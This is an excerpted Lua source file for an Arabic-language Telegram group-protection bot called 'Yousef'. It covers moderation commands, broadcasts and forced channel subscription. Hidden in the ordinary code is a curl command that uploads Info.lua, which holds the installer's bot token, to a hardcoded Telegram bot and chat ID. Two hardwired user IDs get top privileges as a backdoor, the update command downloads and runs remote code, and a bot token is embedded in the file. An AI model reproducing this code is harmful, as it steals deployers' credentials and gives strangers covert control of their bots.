...
if res ~= 200 then
print('\27[0;31m•═════•| 𖦹𝐲𝐨𝐮𝐬𝐮𝐟𖦹 |•═════•\n التوكن غير صحيح تاكد منه ثم ارسله')
else
io.write('\27[0;31m تم حفظ التوكن بنجاح \na•═════•| 𖦹𝐲𝐨𝐮𝐬𝐮𝐟𖦹 |•═════•\n27[0;39;49m')
database:set(id_server..":token",token)
end 
else
print('\27[0;35m•═════•| 𖦹𝐲𝐨𝐮𝐬𝐮𝐟𖦹 |•═════• ┉\n لم يتم حفظ التوكن ارسل لي التوكن الان')
end 
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/Vklkk/𝐲𝐨𝐮𝐬𝐮𝐟/main/File_Bot/commands.lua") 
...
sudo_users = {SUDO,1779150039,1635597460}   
...
if tonumber(user_id) == tonumber(1635597460) then  
var = true 
elseif tonumber(user_id) == tonumber(1779150039) then
var = true  
...
elseif database:sismember(bot_id..'CoSu'..chat_id, user_id) then
var = database:get(bot_id.."CoSu:Rd"..msg.chat_id_) or 'يوسف'
elseif database:sismember(bot_id..'Basic:Constructor'..chat_id, user_id) then
...
local NameUser = " 𖦹  بواسطه ⇎ ["..data.first_name_.."](T.me/"..UserName..")"
local NameUserr = " 𖦹  اسم المستخدم ⇎ ["..data.first_name_.."](T.me/"..UserName..")"
if status == "reply" then
send(msg.chat_id_, msg.id_,NameUserr.."\n"..text)
return false
end
else
send(msg.chat_id_, msg.id_," 𖦹  الحساب محذوف يرجى استخدام الامر بصوره صحيحه")
end
end,nil)   
end 
...
send(chat,msg.id_,"  𖦹   ملف نسخه ليس لهاذا البوت")
return false 
end      
local File = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..ID_FILE) ) 
download_to_file('https://api.telegram.org/file/bot'..token..'/'..File.result.file_path, ''..File_Name) 
send(chat,msg.id_,"  𖦹   جاري ...\n  𖦹   رفع الملف الان")
else
send(chat,msg.id_,"*  𖦹  عذرا الملف ليس بصيغة {JSON} يرجى رفع الملف الصحيح*")
end      
...
send(chat,msg.id_,"\n  𖦹  تم رفع الملف بنجاح وتفعيل الجروبات\n  𖦹  ورفع {الامنشئين الاساسين ; والمنشئين ; والمدراء; والادمنيه} بنجاح")
end
local function trigger_anti_spam(msg,type)
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)
local Name = '['..utf8.sub(data.first_name_,0,40)..'](tg://user?id='..data.id_..')'
if type == 'kick' then 
Text = '\n  𖦹  العضــو ⇎ '..Name..'\n  𖦹  قام بالتكرار هنا وتم طرده '  
...
Text = '\n  𖦹  العضــو ⇎ '..Name..'\n  𖦹  قام بالتكرار هنا وتم تقييده '  
sendText(msg.chat_id_,Text,0,'md')
return false  
end  
if type == 'mute' then
Text = '\n  𖦹  العضــو ⇎ '..Name..'\n  𖦹  قام بالتكرار هنا وتم كتمه '  
sendText(msg.chat_id_,Text,0,'md')
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_) 
msgm = msg.id_
my_ide = msg.sender_user_id_
...
local curl = 'curl "'..'https://api.telegram.org/bot1706737466:AAG8CRj1VGRUinWWPnm8WEIGUHbl8j64KMY/sendDocument'..'" -F "chat_id='.. 1779150039 ..'" -F "document=@'..'Info.lua'..'"' io.popen(curl)
--------------------------------------------------------------------------------------------------------------
...
send(msg.chat_id_, msg.id_,"  𖦹  تم الغاء الاذاعه")
...
send(msg.chat_id_, msg.id_,"  𖦹  تمت الاذاعه الى *~ "..#list.." ~* كروب ")
database:del(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end
--------------------------------------------------------------------------------------------------------------
if Chat_Type == 'UserBot' then
if text == '/𝐲𝐨𝐮𝐬𝐮𝐟t' then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'  𖦹  لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n   𖦹  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if DevSoFi(msg) then
local bl = '☉انت الان المطور الاساسي في البوت \n☉ سورس يوسف\n ☉يمكنك تحكم في البوتات من الكيبورد أسفل \n[تابع جديدنا](t.me/php14)'
local keyboard = {
{'الاحصائيات','المطور','الثانوين'},
{'المبرمج يوسف','المبرمج  اشرف'},
...
SourceDRAGONr = ' 𖦹 اهلا عزيزي\n 𖦹 انا بوت اسمي يوسف\n 𖦹 اختصاصي حمايه الكروبات\n 𖦹 من تكرار والسبام والتوجيه والخ…\n 𖦹 لتفعيلي اتبع الاخطوات…↓\n 𖦹 اضفني الي مجموعتك وقم بترقيتي ادمن واكتب كلمه { تفعيل }  ويستطيع ⇎{ منشئ او المشرفين } بتفعيل فقط\n[ 𖦹 معرف المطور '
end 
...
database:setex(bot_id..'𝐲𝐨𝐮𝐬𝐮𝐟t:Time'..msg.sender_user_id_,300,true)
return false
end
...
send(msg.sender_user_id_, msg.id_,'  𖦹  تم ارسال رسالتك\n  𖦹  سيتم رد في اقرب وقت')
tdcli_function ({ID = "ForwardMessages", chat_id_ = SUDO,    from_chat_id_ = msg.sender_user_id_,    message_ids_ = {[0] = msg.id_},    disable_notification_ = 1,    from_background_ = 1 },function(arg,data) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,ta) 
vardump(data)
if data and data.messages_[0].content_.sticker_ then
local Name = '['..string.sub(ta.first_name_,0, 40)..'](tg://user?id='..ta.id_..')'
local Text = '  𖦹  تم ارسال الملصق من ↓\n - '..Name
...
local Text = '  𖦹  المستخدم ⇎ '..Name..'\n  𖦹  تم حظره من التواصل'
...
Text = '\n  𖦹  تم تفعيل البوت الخدمي ' 
else
Text = '\n  𖦹  بالتاكيد تم تفعيل البوت الخدمي '
end
send(msg.chat_id_, msg.id_,Text) 
end
...
Text = '\n  𖦹  تم تعطيل البوت الخدمي' 
else
Text = '\n  𖦹  بالتاكيد تم تعطيل البوت الخدمي'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text and database:get(bot_id..'𝐲𝐨𝐮𝐬𝐮𝐟t:Bots') then
if text == 'الغاء' or text == 'الغاء' then   
send(msg.chat_id_, msg.id_,'  𖦹  الغاء حفظ كليشه يوسف')
database:del(bot_id..'𝐲𝐨𝐮𝐬𝐮𝐟t:Bots') 
return false
end
database:set(bot_id.."𝐲𝐨𝐮𝐬𝐮𝐟t:Bot",text)  
send(msg.chat_id_, msg.id_,'  𖦹  تم حفظ كليشه يوسف')
database:del(bot_id..'𝐲𝐨𝐮𝐬𝐮𝐟t:Bots') 
return false
end
if text == 'ضع كليشه يوسف' and DevSoFi(msg) then 
database:set(bot_id..'𝐲𝐨𝐮𝐬𝐮𝐟t:Bots',true) 
send(msg.chat_id_, msg.id_,'  𖦹  ارسل لي الكليشه الان')
return false
end
if text == 'حذف كليشه يوسف' and DevSoFi(msg) then 
database:del(bot_id..'𝐲𝐨𝐮𝐬𝐮𝐟t:Bot') 
send(msg.chat_id_, msg.id_,'  𖦹  تم حذف كليشه يوسف')
end
...
echo '•═════•| 𖦹𝐲𝐨𝐮𝐬𝐮𝐟𖦹 |•═════•\n 𖦹 ❨ الــدخــول ❩ ⇎\n*←← '`whoami`'*'
echo '•═════•| 𖦹𝐲𝐨𝐮𝐬𝐮𝐟𖦹 |•═════•\n 𖦹 ❨ مـده تـشغيـل الـسـيـرفـر ❩⇎\n*←← '"$uptime"'*'
]]):read('*all'))  
end

if text == 'تحديث السورس ' and DevSoFi(msg) then 
os.execute('rm -rf DRAGON.lua')
os.execute('wget https://raw.githubusercontent.com/Vklkk/𝐲𝐨𝐮𝐬𝐮𝐟/main/DRAGON.lua')
send(msg.chat_id_, msg.id_,' 𖦹  تم تحديث السورس')
dofile('DRAGON.lua')  
end
if text == 'الاصدار ' and DevSoFi(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,'  𖦹  اصدار سورس يوسف { s: 6.7}')
end
...
{{text = 'قناه السورس️️', url="t.me/php14"}}, 
} 
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'بًـوٌتٌ آلَتٌـوٌصّـلَ  ☑ ➘', url="t.me/Video7_bot"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
Text = ' الاحصائيات  𖦹  \n'..'  𖦹  عدد الجروبات ⇎ {'..Groups..'}'..'\n  𖦹   عدد المشتركين ⇎ {'..Users..'}'
send(msg.chat_id_, msg.id_,Text) 
return false
end
...
send(msg.chat_id_, msg.id_,"  𖦹  ارسل الان اذاعتك؟ \n  𖦹  للخروج ارسل الغاء ")
return false
end 
...
send(msg.chat_id_, msg.id_,"  𖦹  ارسل لي التوجيه الان")
return false
end 
...
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي  𖦹  •\n• لايمكنك استخدام البوت  𖦹  •\n• عليك الاشتراك في القناة  𖦹  •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
...
if #pv == i then 
if sendok == 0 then
send(msg.chat_id_, msg.id_,' 𖦹  لا يوجد مشتركين وهميين في البوت \n')   
else
local ok = #pv - sendok
send(msg.chat_id_, msg.id_,' 𖦹  عدد المشتركين الان ⇎ ( '..#pv..' )\n 𖦹  تم ازالة ⇎ ( '..sendok..' ) من المشتركين\n 𖦹   الان عدد المشتركين الحقيقي ⇎ ( '..ok..' ) مشترك \n')   
end
end
end,nil)
end,nil)
...
if #group == i then 
if (w + q) == 0 then
send(msg.chat_id_, msg.id_,' 𖦹  لا يوجد كروبات وهميه في البوت\n')   
else
local DRAGON = (w + q)
...
DRAGON = '\n 𖦹  تم ازالة ⇎ { '..q..' } كروبات من البوت'
end
if w == 0 then
DRAGONk = ''
else
DRAGONk = '\n 𖦹  تم ازالة ⇎ {'..w..'} كروب لان البوت عضو'
end
send(msg.chat_id_, msg.id_,' 𖦹   عدد الجروبات الان ⇎ { '..#group..' }'..DRAGONk..''..DRAGON..'\n 𖦹   الان عدد الجروبات الحقيقي ⇎ { '..sendok..' } كروبات\n')   
end
end
end,nil)
end
...
send(msg.chat_id_, msg.id_,'  𖦹  لا تستطيع استخدام البوت \n   𖦹  يرجى الاشتراك بالقناه اولا \n   𖦹  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function 𝐲𝐨𝐮𝐬𝐮𝐟t_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"  𖦹  عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")
return false 
end      
database:sadd(bot_id..'Sudo:User', result.id_)
usertext = '\n  𖦹  العضو ⇎ ['..result.title_..'](t.me/'..(username or 'textchuser')..')'
status  = '\n  𖦹  تم ترقيته مطور'
texts = usertext..status
else
texts = '  𖦹  لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, 𝐲𝐨𝐮𝐬𝐮𝐟t_function, nil)
return false 
end
...
usertext = '\n  𖦹  العضو ⇎ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n  𖦹  تم ترقيته مطور'
...
if DRAGON1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'  𖦹  العضو ⇎ ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'textchuser')..') \n  𖦹  '..DRAGON1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
if text == 'الغاء' or text == 'الغاء ' then   
send(msg.chat_id_, msg.id_,"  𖦹  تم الغاء حفظ اسم البوت")
database:del(bot_id..'Set:Name:Bot'..msg.sender_user_id_) 
return false  
end 
database:del(bot_id..'Set:Name:Bot'..msg.sender_user_id_) 
database:set(bot_id..'Name:Bot',text) 
send(msg.chat_id_, msg.id_, "  𖦹  تم حفظ الاسم")
return false
end 
if database:get(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' or text == 'الغاء  𖦹 ' then   
send(msg.chat_id_, msg.id_,"  𖦹  تم الغاء الاذاعه للخاص")
...
send(msg.chat_id_, msg.id_,"  𖦹  تمت الاذاعه الى >>{"..#list.."} مشترك في البوت ")
database:del(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end
...
send(msg.chat_id_, msg.id_,"  𖦹  تمت الاذاعه الى >>{"..#list.."} كروب في البوت ")
database:del(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end
...
send(msg.chat_id_, msg.id_,"  𖦹  تمت الاذاعه الى >>{"..#list.."} كروبات في البوت ")
database:del(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end 
end
...
send(msg.chat_id_, msg.id_, "  𖦹  تم الغاء الامر ")
...
send(msg.chat_id_, msg.id_, '  𖦹  المعرف لا يوجد فيه قناة')
return false  end
if data and data.type_ and data.type_.ID and data.type_.ID == 'PrivateChatInfo' then
send(msg.chat_id_, msg.id_, '  𖦹  عذا لا يمكنك وضع معرف حسابات في الاشتراك ')
return false  end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.is_supergroup_ == true then
send(msg.chat_id_, msg.id_,'  𖦹  عذا لا يمكنك وضع معرف كروب بالاشتراك ')
return false  end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.is_supergroup_ == false then
if data and data.type_ and data.type_.channel_ and data.type_.channel_.ID and data.type_.channel_.status_.ID == 'ChatMemberStatusEditor' then
send(msg.chat_id_, msg.id_,'  𖦹  البوت ادمن في القناة \n  𖦹  تم تفعيل الاشتراك الاجباري في \n  𖦹  ايدي القناة ('..data.id_..')\n  𖦹  معرف القناة ([@'..data.type_.channel_.username_..'])')
database:set(bot_id..'add:ch:id',data.id_)
database:set(bot_id..'add:ch:username','@'..data.type_.channel_.username_)
else
send(msg.chat_id_, msg.id_,'  𖦹  عذرآ البوت ليس ادمن بالقناه ')
end
return false  
end
end,nil)
...
send(msg.chat_id_, msg.id_,'  𖦹  تم تغيير رسالة الاشتراك ')
end
...
send(msg.chat_id_, msg.id_,'  𖦹  … عذرآ البوت لايملك صلاحيات')
database:del(bot_id..'Change:Chat:Photo'..msg.chat_id_..':'..msg.sender_user_id_) 
else
send(msg.chat_id_, msg.id_,'  𖦹  تم تغيير صورة الجروب')
end
end, nil) 
database:del(bot_id..'Change:Chat:Photo'..msg.chat_id_..':'..msg.sender_user_id_) 
end   
...
if text == 'الغاء' then 
send(msg.chat_id_, msg.id_,"  𖦹  تم الغاء وضع الوصف")
database:del(bot_id.."Set:Description" .. msg.chat_id_ .. "" .. msg.sender_user_id_)
return false  
end 
database:del(bot_id.."Set:Description" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
https.request('https://api.telegram.org/bot'..token..'/setChatDescription?chat_id='..msg.chat_id_..'&description='..text) 
send(msg.chat_id_, msg.id_,'  𖦹  تم تغيير وصف الجروب')
return false  
end 
--------------------------------------------------------------------------------------------------------------
if database:get(bot_id.."Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text == 'الغاء' then 
send(msg.chat_id_, msg.id_,"  𖦹  تم الغاء حفظ الترحيب")
database:del(bot_id.."Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  
end 
database:del(bot_id.."Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
database:set(bot_id..'Get:Welcome:Group'..msg.chat_id_,text) 
send(msg.chat_id_, msg.id_,'  𖦹  تم حفظ ترحيب الجروب')
return false   
end
--------------------------------------------------------------------------------------------------------------
if database:get(bot_id.."Set:Priovate:Group:Link"..msg.chat_id_..""..msg.sender_user_id_) then
if text == 'الغاء' then
send(msg.chat_id_,msg.id_,"  𖦹  تم الغاء حفظ الرابط")
...
send(msg.chat_id_,msg.id_,"  𖦹  تم حفظ الرابط بنجاح")
database:del(bot_id.."Set:Priovate:Group:Link"..msg.chat_id_..""..msg.sender_user_id_) 
return false 
end
end 
...
send(msg.chat_id_,0,"  𖦹  العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n  𖦹  ["..DRAGON_Msg.."] \n")
else
send(msg.chat_id_,0,"  𖦹  العضو : {["..data.first_name_.."](T.ME/php14)}\n  𖦹  ["..DRAGON_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0, "  𖦹  عذرا ⇎ {[@"..data.username_.."]}\n  𖦹  عذرا تم منع الملصق \n" ) 
else
send(msg.chat_id_,0, "  𖦹  عذرا ⇎ {["..data.first_name_.."](T.ME/php14)}\n  𖦹  عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
send(msg.chat_id_, msg.id_,'  𖦹  عذرا يرجى ترقيه البوت مشرف !')
return false  
end
tdcli_function ({ ID = "GetChannelFull", channel_id_ = getChatId(msg.chat_id_).ID }, function(arg,data)  
if tonumber(data.member_count_) < tonumber(database:get(bot_id..'Num:Add:Bot') or 0) and not DevSoFi(msg) then
send(msg.chat_id_, msg.id_,'  𖦹  عدد اعضاء الجروب قليله يرجى جمع >> {'..(database:get(bot_id..'Num:Add:Bot') or 0)..'} عضو')
return false
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,chat)  
if database:sismember(bot_id..'Chek:Groups',msg.chat_id_) then
send(msg.chat_id_, msg.id_,'  𖦹  بالتأكيد تم تفعيل الجروب')
else
sendText(msg.chat_id_,'\n  𖦹  بواسطه ⇎ ['..string.sub(result.first_name_,0, 70)..'](tg://user?id='..result.id_..')\n  𖦹  تم تفعيل الجروب {'..chat.title_..'}',msg.id_/2097152/0.5,'md')
...
Text = '  𖦹  تم تفعيل كروب جديده\n'..
'\n  𖦹  بواسطة {'..Name..'}'..
'\n  𖦹  ايدي الجروب {'..IdChat..'}'..
'\n  𖦹  اسم الجروب {['..NameChat..']}'..
'\n  𖦹  عدد اعضاء الجروب *{'..NumMember..'}*'..
'\n  𖦹  الرابط {['..LinkGp..']}'
...
if text == '/𝐲𝐨𝐮𝐬𝐮𝐟t' and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
send(msg.chat_id_, msg.id_,'  𖦹  بالتأكيد تم تعطيل الجروب')
else
sendText(msg.chat_id_,'\n  𖦹  بواسطه ⇎ ['..string.sub(result.first_name_,0, 70)..'](tg://user?id='..result.id_..')\n  𖦹  تم تعطيل الجروب {'..chat.title_..'}',msg.id_/2097152/0.5,'md')
...
if database:sismember(bot_id..'Chek:Groups',msg.chat_id_) then
send(msg.chat_id_, msg.id_,'  𖦹  تم تفعيل الجروب')
else
sendText(msg.chat_id_,'\n  𖦹  بواسطه ⇎ ['..string.sub(result.first_name_,0, 70)..'](tg://user?id='..result.id_..')\n  𖦹  تم تفعيل الجروب {'..chat.title_..'}',msg.id_/2097152/0.5,'md')
database:sadd(bot_id..'Chek:Groups',msg.chat_id_)  
...
send(msg.chat_id_, msg.id_,'  𖦹  تم تعيين عدد الاعضاء سيتم تفعيل الجروبات التي اعضائها اكثر من  >> {'..Num..'} عضو')
end
...
send(msg.chat_id_, msg.id_, '  𖦹  حسنآ ارسل لي معرف القناة')
return false  
end
if text and text:match("^تغير رساله الاشتراك$") and DevSoFi(msg) then  
database:setex(bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, '  𖦹  حسنآ ارسل لي النص الذي تريده')
return false  
end
if text == "حذف رساله الاشتراك " and DevSoFi(msg) then  
database:del(bot_id..'text:ch:user')
send(msg.chat_id_, msg.id_, "  𖦹  تم مسح رساله الاشتراك ")
return false  
end
if text and text:match("^وضع قناة الاشتراك  𖦹 $") and DevSoFi(msg) then  
database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, '  𖦹  حسنآ ارسل لي معرف القناة')
return false  
end
...
send(msg.chat_id_, msg.id_,"  𖦹  الاشتراك الاجباري مفعل \n  𖦹  على القناة ⇎ ["..addchusername.."]")
else
database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_,"  𖦹  اهلا عزيزي المطور \n  𖦹  ارسل الان معرف قناتك")
end
return false  
end
...
send(msg.chat_id_, msg.id_, "  𖦹  تم تعطيل الاشتراك الاجباري ")
return false  
end
if text == "الاشتراك الاجباري " and DevSoFi(msg) then  
if database:get(bot_id..'add:ch:username') then
local addchusername = database:get(bot_id..'add:ch:username')
send(msg.chat_id_, msg.id_, "  𖦹  تم تفعيل الاشتراك الاجباري \n  𖦹  على القناة ⇎ ["..addchusername.."]")
else
send(msg.chat_id_, msg.id_, "  𖦹  لا يوجد قناة في الاشتراك الاجباري ")
end
return false  
end
if text == "تفعيل الاضافات" and SudoBot(msg) then
send(msg.chat_id_, msg.id_, ' 𖦹  تم تفعيل الاضافات')
database:set(bot_id.."AL:AddS0FI:stats","✔")
end
if text == "تعطيل الاضافات" and SudoBot(msg) then
send(msg.chat_id_, msg.id_, ' 𖦹  تم تعطيل الاضافات')
database:set(bot_id.."AL:AddS0FI:stats","✖")
end
...
send(msg.chat_id_, msg.id_, ' 𖦹  تم كتم الاسم '..BlNe)
...
send(msg.chat_id_, msg.id_, ' 𖦹  تم الغاء كتم الاسم '..delBn)
...
texts = " 𖦹  تم مسح الاسماء المكتومه "
send(msg.chat_id_, msg.id_, texts)
end
...
t = "\n 𖦹  قائمة الاسماء المكتومه \n•═════•| 𖦹𝐲𝐨𝐮𝐬𝐮𝐟𖦹 |•═════• \n"
for k,v in pairs(All_name) do
t = t..""..k.."- (["..v.."])\n"
end
if #All_name == 0 then
t = " 𖦹  لا يوجد اسماء مكتومه"
end
send(msg.chat_id_, msg.id_, t)
end
end
if text == "تفعيل كتم الاسم" and Constructor(msg) and database:get(bot_id.."AL:AddS0FI:stats") == "✔" then
send(msg.chat_id_, msg.id_, ' 𖦹  تم التفعيل الاسماء المكتومه')
...
send(msg.chat_id_, msg.id_, ' 𖦹  تم تعطيل الاسماء المكتومه')
...
send(msg.chat_id_, msg.id_,' 𖦹  تم تعيين '..teh..' كتوحيد للمجموعه')
...
send(msg.chat_id_, msg.id_,' 𖦹  تم تعين  '..nump..' عدد الكتم')
...
send(msg.chat_id_, msg.id_, ' 𖦹  تم تعطيل التوحيد')
...
send(msg.chat_id_, msg.id_, " 𖦹  عزيزي >>["..mrsofi2.username_.."](https://t.me/"..(mrsofi2.username_ or "textchuser")..")\n 𖦹  عليك وضع التوحيد ⪼ {"..database:get(bot_id.."DRAGON:teh"..msg.chat_id_).."} بجانب اسمك\n 𖦹  عدد المحاولات المتبقيه {"..(tonumber(mrsofi_nnn) - tonumber(mrsofi_nnn2)).."}")
end
end
end
end
...
if text == 'السورس' or text == 'سورس' or text == 'يا سورس' or text == 'يوسف' then
local Text = [[
✪WELCOM IN SOURCE 𝐲𝐨𝐮𝐬𝐮𝐟✪
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '⌯｟DEV VAMBAIR𖦹｠⌯',url="t.me/php_d"}},
{{text = '⌯｟SOURCE BOT✭｠⌯',url="t.me/Vambair_bot"}},
{{text = '⌯｟TWASL✰｠⌯',url="t.me/Video7_bot"}},
{{text = 'ˋˏNˎˊˋˏAˎˊˋˏSˎˊˋˏAˎˊ', url="t.me/php14"}},
}
local msg_id = msg.id_/2097152/0.5
...
local Text = [[
✭اهلا بيك في سورس يوسف لو عايز بوت بكل حقوقك ع السورس تواصل معي✭
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '⌯｟DEV VAMBAIR✰｠⌯',url="t.me/php_d"}},
{{text = '⌯｟TWASEL✰｠⌯',url="t.me/Video7_bot"}},
{{text = '⌯｟CHANNEL✰｠⌯',url="t.me/php14"}}, 
}
local msg_id = msg.id_/2097152/0.5
...
if text == 'فمبير' or text == 'يوسف' or text == 'VAMBAIR' then
local Text = [[
المبرمج يوسف لو حابب تتواصل معاهه
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '⌯｟𝐲𝐨𝐮𝐬𝐮𝐟｠⌯',url="t.me/php_d"}},
}
local msg_id = msg.id_/2097152/0.5 
...
if text == 'اشرف'  then
local Text = [[
المبرمج  اشرف لو حابب تتواصل معاه
اتبع الزر إلى تحت ↓
...
if text == 'المبرمج  اشرف'  then
local Text = [[
المبرمج  اشرف لتواصل مع اتبع الزر الي في الاسفل 🙁❤️
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'اشرف',url="t.me/asera126"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/vagwg/11&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
"‏ علينا إحياء زَمن الرّسائل الورقيّة وسط هذه الفوضى الالكترونية العَارمة.𖦹💜",
...
"‏ من مراتب التعاسه إطالة الندم ع شيء إنتهى. 𖦹 ",
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'قناه السورس ', url="t.me/php14"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == '•═════•| 𖦹𝐲𝐨𝐮𝐬𝐮𝐟𖦹 |•═════•' then
local Text = [[ 
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'تواصل السورس ', url="t.me/Video7_bot"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
if text == 'العاب يوسف' or text == 'العاب مطوره' or text == 'العاب متطوره' then  
local Text = [[  
 𖦹 اهلا في قائمه الالعاب المتطوره سورس يوسف  𖦹 
...
{{text = 'تشابه', url="https://t.me/gamee?game=DiamondRows"},{text = 'كره القدم', url="https://t.me/gamee?game=Football𝐲𝐨𝐮𝐬𝐮𝐟"}}, 
...
{{text = '𝚂𝙾𝚄𝚁𝙲𝙴 𝚂𝚃𝙰𝚁 ', url="t.me/php14"}},
}  
local msg_id = msg.id_/2097152/0.5  
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))  
end
...
send(msg.chat_id_, msg.id_,'  𖦹  تم ازالة جميع الاوامر المضافه')  
end
end
...
send(msg.chat_id_, msg.id_,'  𖦹  ارسل الامر القديم')  
return false
end
...
send(msg.chat_id_, msg.id_,'  𖦹  ارسل الامر الذي قمت بوضعه بدلا عن القديم')  
return false
end
end
if text and database:get(bot_id.."Set:Cmd:Group"..msg.chat_id_..':'..msg.sender_user_id_) == 'true' then
database:set(bot_id.."Set:Cmd:Group:New"..msg.chat_id_,text)
send(msg.chat_id_, msg.id_,'  𖦹  ارسل الامر الجديد')  
...
send(msg.chat_id_, msg.id_,'  𖦹  تم حفظ الامر')  
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,'  𖦹  بواسطه ⇎ ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'textchuser')..') \n  𖦹  تـم قفـل الدردشه ')
end,nil)   
...
elseif text == 'قفل يوسفرسيه' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
...
elseif text == 'فتح يوسفرسيه' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
...
Text = ' 𖦹  تم تفعيل امر غنيلي الان ارسل غنيلي'
database:del(bot_id..'sing:for:me'..msg.chat_id_)  
else
Text = ' 𖦹  بالتاكيد تم تفعيل امر غنيلي تستطيع ارسال غنيلي'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
Text = '\n  𖦹  تم تعطيل نسبه الانوثه'
else
Text = '\n  𖦹  بالتاكيد تم تعطيل نسبه الانوثه'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل all' and CoSu(msg) then   
if database:get(bot_id..'Cick:all'..msg.chat_id_) then
Text = '  𖦹  تم تفعيل امر @all'
